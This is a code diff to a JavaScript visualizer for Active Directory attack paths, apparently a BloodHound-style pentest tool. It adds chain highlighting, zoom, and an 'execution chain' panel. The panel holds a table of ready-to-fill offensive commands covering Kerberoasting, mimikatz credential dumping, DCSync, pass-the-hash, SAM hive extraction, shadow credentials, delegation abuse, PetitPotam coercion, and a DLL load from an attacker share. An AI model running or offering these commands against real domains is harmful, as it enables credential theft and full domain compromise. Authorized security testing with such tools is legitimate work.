@@ -188,9 +188,17 @@ const BloodTrailEnhance = (() => {
       el.classList.toggle('active', el.dataset.chain === activeChainId);
     });
 
+    const rightSvg = d3.select('#right-svg');
+
+
     if (isToggle || !activeChainId) {
+      // Reset all
       if (window._btRightEdges) window._btRightEdges.style('opacity', null);
       if (window._btRightNodeGs) window._btRightNodeGs.style('opacity', null);
+      rightSvg.selectAll('.edge-group').style('opacity', null);
+      showExecutionChain(null);
+
+      _resetZoom();
       return;
     }
 
@@ -198,16 +206,71 @@ const BloodTrailEnhance = (() => {
     if (!chain) return;
 
     const chainNodes = new Set();
-    chain.steps.forEach(s => { if (s.from) chainNodes.add(s.from); if (s.to) chainNodes.add(s.to); });
+    const chainEdgeKeys = new Set();
+    chain.steps.forEach((s, i) => {
+      if (s.from) chainNodes.add(s.from);
+      if (s.to) chainNodes.add(s.to);
+      chainEdgeKeys.add(`${s.from}→${s.to}`);
+    });
 
+    // Aggressively dim non-chain elements
     if (window._btRightEdges) {
       window._btRightEdges.style('opacity', d => {
-        return (chainNodes.has(d.source_id) && chainNodes.has(d.target_id)) ? 0.9 : 0.05;
+        return chainEdgeKeys.has(`${d.source_id}→${d.target_id}`) ? 1 : 0.03;
       });
     }
+    // Also dim edge labels in edge-groups
+    rightSvg.selectAll('.edge-group').style('opacity', function(d) {
+      return chainEdgeKeys.has(`${d.source_id}→${d.target_id}`) ? 1 : 0.03;
+    });
+
     if (window._btRightNodeGs) {
-      window._btRightNodeGs.style('opacity', d => chainNodes.has(d.id) ? 1 : 0.1);
+      window._btRightNodeGs.style('opacity', d => chainNodes.has(d.id) ? 1 : 0.05);
     }
+
+    _zoomToChain(chainNodes);
+    showExecutionChain(chainId);
+  }
+
+  function _resetZoom() {
+    const transform = d3.zoomIdentity;
+    const rightSvg = d3.select('#right-svg');
+    const leftSvg = d3.select('#left-svg');
+    rightSvg.transition().duration(500).call(d3.zoom().transform, transform);
+    leftSvg.transition().duration(500).call(d3.zoom().transform, transform);
+    d3.select('#right-svg g').transition().duration(500).attr('transform', transform);
+    d3.select('#left-svg g').transition().duration(500).attr('transform', transform);
+  }
+
+  function _zoomToChain(chainNodes) {
+    if (!window._btNodes) return;
+    const nodes = window._btNodes.filter(n => chainNodes.has(n.id));
+    if (!nodes.length) return;
+
+    let minX = Infinity, maxX = -Infinity, minY = Infinity, maxY = -Infinity;
+    nodes.forEach(n => {
+      minX = Math.min(minX, n.x); maxX = Math.max(maxX, n.x);
+      minY = Math.min(minY, n.y); maxY = Math.max(maxY, n.y);
+    });
+
+    const pad = 80;
+    minX -= pad; maxX += pad; minY -= pad; maxY += pad;
+
+    const rightPanel = document.getElementById('right-panel');
+    const sidebarW = 240;
+    const pw = rightPanel.clientWidth - sidebarW, ph = rightPanel.clientHeight;
+    const bw = maxX - minX, bh = maxY - minY;
+    const scale = Math.min(pw / bw, ph / bh, 2.5);
+    const cx = (minX + maxX) / 2, cy = (minY + maxY) / 2;
+    const tx = pw / 2 - cx * scale, ty = ph / 2 - cy * scale;
+
+    const transform = d3.zoomIdentity.translate(tx, ty).scale(scale);
+    const rightSvg = d3.select('#right-svg');
+    const leftSvg = d3.select('#left-svg');
+    rightSvg.transition().duration(500).call(d3.zoom().transform, transform);
+    leftSvg.transition().duration(500).call(d3.zoom().transform, transform);
+    d3.select('#right-svg g').transition().duration(500).attr('transform', transform);
+    d3.select('#left-svg g').transition().duration(500).attr('transform', transform);
   }
 
   function markAsPwned(nodeId) {
@@ -283,5 +346,122 @@ const BloodTrailEnhance = (() => {
     });
   }
 
-  return { applyEnhancements, updateHeatTrailColors, highlightChain, markAsPwned };
+  // === Execution Chain Component ===
+
+  // Maps action types to executable command templates
+  // {target} = target host/domain, {user} = username, {from}/{to} = node display names
+  const CMD_TEMPLATES = {
+    'Kerberoast':              { tool: 'impacket',  cmd: 'GetUserSPNs.py {domain}/{user} -request -outputfile kerberoast.hash', note: 'Crack with hashcat -m 13100' },
+    'AS-REP Roast':            { tool: 'impacket',  cmd: 'GetNPUsers.py {domain}/ -usersfile users.txt -format hashcat -outputfile asrep.hash', note: 'Crack with hashcat -m 18200' },
+    'AdminTo':                 { tool: 'impacket',  cmd: 'psexec.py {domain}/{user}@{to_host}', note: 'Alt: wmiexec.py, smbexec.py' },
+    'HasSession':              { tool: 'mimikatz',   cmd: 'sekurlsa::logonpasswords', note: 'Run on {to_host} as SYSTEM to extract creds' },
+    'DCSync':                  { tool: 'impacket',  cmd: 'secretsdump.py {domain}/{user}@{dc} -just-dc', note: 'Dumps all domain NTLM hashes' },
+    'GenericAll':              { tool: 'bloodyAD',   cmd: 'bloodyAD -d {domain} -u {user} -p \'PASS\' set password {to_name} \'NewP@ss123\'', note: 'Full control — reset password or add to group' },
+    'GenericWrite':            { tool: 'impacket',  cmd: 'targetedKerberoast.py -d {domain} -u {user} -p \'PASS\'', note: 'Set SPN then kerberoast target' },
+    'WriteDacl':               { tool: 'impacket',  cmd: 'dacledit.py -action write -rights DCSync -principal {user} -target-dn \'{to_dn}\' {domain}/{user}', note: 'Grant DCSync rights via DACL' },
+    'AddMember':               { tool: 'net',       cmd: 'net rpc group addmem "{to_name}" "{user}" -U {domain}/{user} -S {dc}', note: 'Add user to group' },
+    'AddKeyCredentialLink':    { tool: 'pywhisker',  cmd: 'pywhisker.py -d {domain} -u {user} -p \'PASS\' --target {to_name} --action add', note: 'Shadow credentials — then request TGT with PKINIT' },
+    'Authenticate':            { tool: 'certipy',    cmd: 'certipy auth -pfx {to_name}.pfx -dc-ip {dc_ip}', note: 'PKINIT auth with shadow credential' },
+    'MemberOf':                { tool: 'info',       cmd: null, note: 'Existing group membership — no action needed' },
+    'WriteAccountRestrictions': { tool: 'impacket',  cmd: 'rbcd.py -delegate-to {to_name} -delegate-from YOURPC$ -action write {domain}/{user}', note: 'Configure RBCD on target' },
+    'RBCD':                    { tool: 'impacket',  cmd: 'getST.py -spn cifs/{to_host} -impersonate Administrator {domain}/YOURPC$ -dc-ip {dc_ip}', note: 'S4U2Proxy → service ticket as Admin' },
+    'CoerceToTGT':             { tool: 'petitpotam', cmd: 'petitpotam.py -d {domain} {from_host} {to_host}', note: 'Coerce target DC to authenticate back' },
+    'CaptureTGT':              { tool: 'rubeus',     cmd: 'Rubeus.exe monitor /interval:5 /nowrap', note: 'Capture TGT from unconstrained delegation' },
+    'CanPSRemote':             { tool: 'evil-winrm', cmd: 'evil-winrm -i {to_host} -u {user} -p \'PASS\'', note: 'PowerShell remoting access' },
+    'CanRDP':                  { tool: 'xfreerdp',   cmd: 'xfreerdp /v:{to_host} /u:{user} /d:{domain}', note: 'RDP access' },
+    'ExtractKeys':             { tool: 'mimikatz',   cmd: 'sekurlsa::ekeys', note: 'Extract machine account keys on target' },
+    'S4U2Self':                { tool: 'impacket',  cmd: 'getST.py -self -impersonate Administrator -altservice cifs/{dc} {domain}/{from_name}$ -k -no-pass', note: 'S4U2Self ticket request' },
+    'S4U2Proxy':               { tool: 'impacket',  cmd: 'getST.py -spn cifs/{to_host} -impersonate Administrator {domain}/{from_name}$ -k -no-pass', note: 'Constrained delegation → target service' },
+    'DnsAdmin DLL':            { tool: 'dnscmd',     cmd: 'dnscmd {to_host} /config /serverlevelplugindll \\\\ATTACKER\\share\\evil.dll', note: 'Restart DNS service to trigger DLL load' },
+    'SYSTEM':                  { tool: 'result',     cmd: null, note: 'SYSTEM shell obtained on target' },
+    'SetSPN':                  { tool: 'bloodyAD',   cmd: 'bloodyAD -d {domain} -u {user} -p \'PASS\' set object {to_name} servicePrincipalName -v HTTP/{to_name}', note: 'Set fake SPN for targeted kerberoast' },
+    'BackupSAM':               { tool: 'reg',        cmd: 'reg save HKLM\\SAM C:\\Temp\\SAM && reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM', note: 'Backup Operators can save registry hives' },
+    'ExtractHashes':           { tool: 'impacket',  cmd: 'secretsdump.py -sam SAM -system SYSTEM LOCAL', note: 'Extract NTLM hashes from saved hives' },
+    'PassTheHash':             { tool: 'impacket',  cmd: 'psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:NTHASH {domain}/Administrator@{to_host}', note: 'Pass-the-hash with extracted NTLM' },
+    'Compromise':              { tool: 'info',       cmd: null, note: 'Prerequisite — use prior chain or known credentials' },
+    'Monitor':                 { tool: 'rubeus',     cmd: 'Rubeus.exe monitor /interval:5 /nowrap /targetuser:{to_name}$', note: 'Monitor for incoming TGTs on unconstrained host' },
+    'GrantDCSync':             { tool: 'impacket',  cmd: 'dacledit.py -action write -rights DCSync -principal {user} -target-dn \'{to_dn}\' {domain}/{user}', note: 'Grant DCSync via WriteDACL' },
+    'CreateUser':              { tool: 'net',        cmd: 'net user fakeuser P@ssw0rd123 /add /domain', note: 'Account Operators can create domain users' },
+    'ForestCompromise':        { tool: 'result',     cmd: null, note: 'Full forest compromise achieved' },
+  };
+
+  function _resolveCmd(template, step, chain, data) {
+    if (!template || !template.cmd) return null;
+    const nodes = data?.nodes || [];
+    const fromNode = nodes.find(n => n.id === step.from);
+    const toNode = nodes.find(n => n.id === step.to);
+    const domain = data?.meta?.name || 'DOMAIN';
+    const dc = nodes.find(n => n.label === 'Domain')?.name || domain;
+    const dcComp = nodes.find(n => n.props?.is_dc)?.name || 'DC01';
+
+    const shortN = (n) => n ? n.name.split('@')[0].split('.')[0] : '?';
+
+    return template.cmd
+      .replace(/\{domain\}/g, domain)
+      .replace(/\{user\}/g, shortN(fromNode))
+      .replace(/\{from_name\}/g, shortN(fromNode))
+      .replace(/\{to_name\}/g, shortN(toNode))
+      .replace(/\{from_host\}/g, fromNode?.name || '?')
+      .replace(/\{to_host\}/g, toNode?.name || '?')
+      .replace(/\{dc\}/g, dcComp)
+      .replace(/\{dc_ip\}/g, '10.10.10.X')
+      .replace(/\{to_dn\}/g, `DC=${domain.split('.').join(',DC=')}`);
+  }
+
+  function _stepIcon(action, template) {
+    if (!template) return '\u2699';          // gear
+    if (template.tool === 'result') return '\u2714'; // checkmark
+    if (template.tool === 'info') return '\u2139';   // info
+    return '\u25B6';                          // play triangle
+  }
+
+  function showExecutionChain(chainId) {
+    const el = document.getElementById('execution-chain');
+    if (!currentData) { el.classList.remove('visible'); return; }
+
+    if (!chainId) { el.classList.remove('visible'); return; }
+
+    const chain = currentData.chains.find(c => c.id === chainId);
+    if (!chain) { el.classList.remove('visible'); return; }
+
+    const nodes = currentData.nodes || [];
+    const shortN = (id) => {
+      const n = nodes.find(nn => nn.id === id);
+      return n ? n.name.split('@')[0].split('.')[0] : '?';
+    };
+
+    const stepsHtml = chain.steps.map((step, i) => {
+      const template = CMD_TEMPLATES[step.action];
+      const cmd = _resolveCmd(template, step, chain, currentData);
+      const isInfo = template?.tool === 'info' || template?.tool === 'result';
+      const arrow = step.to ? `${shortN(step.from)} \u2192 ${shortN(step.to)}` : shortN(step.from);
+      const connector = i < chain.steps.length - 1 ? '<div class="step-connector">\u25B6</div>' : '';
+
+      return `
+        <div class="chain-step ${isInfo ? 'chain-step-info' : ''}">
+          <div class="step-header">
+            <span class="step-number">${i + 1}</span>
+            <span class="step-action">${step.action}</span>
+            ${template?.tool && !isInfo ? `<span class="step-tool">${template.tool}</span>` : ''}
+          </div>
+          <div class="step-arrow">${arrow}</div>
+          <div class="step-desc">${step.description}</div>
+          ${cmd ? `<div class="step-cmd"><code>${cmd}</code></div>` : ''}
+          ${template?.note ? `<div class="step-note">${template.note}</div>` : ''}
+        </div>${connector}`;
+    }).join('');
+
+    el.innerHTML = `
+      <div class="exec-header">
+        <span class="exec-label">EXECUTION CHAIN</span>
+        <span class="severity-badge severity-${chain.severity}">${chain.severity}</span>
+        <span class="exec-name">${chain.name}</span>
+        <button class="exec-close" onclick="BloodTrailEnhance.highlightChain('${chain.id}')">\u2715</button>
+      </div>
+      <div class="exec-steps">${stepsHtml}</div>`;
+
+    el.classList.add('visible');
+  }
+
+  return { applyEnhancements, updateHeatTrailColors, highlightChain, markAsPwned, showExecutionChain };
 })();
